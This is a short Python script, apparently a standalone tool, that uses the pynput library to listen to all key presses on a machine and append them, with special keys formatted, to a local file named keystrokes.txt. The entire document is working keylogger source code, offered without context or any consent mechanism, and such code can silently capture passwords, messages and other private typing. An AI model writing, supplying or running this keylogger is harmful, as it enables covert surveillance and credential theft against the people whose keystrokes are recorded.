from pynput.keyboard import Listener

LOG_FILE = "keystrokes.txt"

def log_keystroke(key):
    key = str(key).replace("'", "")  # Remove quotes around key name
    if key == "Key.space":
        key = " "  # Replace "Key.space" with an actual space
    elif key == "Key.enter":
        key = "\n"  # Newline for Enter key
    elif key.startswith("Key."):
        key = f"[{key.replace('Key.', '')}]"  # Format special keys

    with open(LOG_FILE, "a") as file:
        file.write(key)

with Listener(on_press=log_keystroke) as listener:
    listener.join()
